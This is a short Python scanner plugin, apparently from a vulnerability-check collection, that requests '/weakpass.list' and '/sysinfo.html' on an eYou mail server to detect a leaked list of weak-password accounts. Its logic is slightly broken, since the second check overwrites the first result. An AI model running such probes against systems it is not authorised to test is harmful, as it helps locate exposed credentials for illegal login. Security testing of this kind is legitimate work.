#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 亿邮邮箱弱口令列表泄露
referer: http://wooyun.org/bugs/wooyun-2010-061538
author: Lucifer
description: 亿邮邮件系统存在弱口令账户信息泄露，导致非法登录
'''
import sys
import requests
import warnings
def run(url):

        result = ['亿邮邮箱弱口令列表泄露', '', '']

        payload = "/weakpass.list"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
            if req.status_code == 200 and r"@" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
            return result

        payload = "/sysinfo.html"
        vulnurl = url + payload
        try:
            req = requests.get(vulnurl, timeout=10, verify=False, allow_redirects=False)
            if req.status_code == 200 and r"系统基本信息检查" in req.text:
                result[2]=  '存在'
                result[1] = vulnurl
            else:
                result[2]=  '不存在'

        except:
            result[2]='不存在'
            return result
        return result

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = run(sys.argv[1])
    
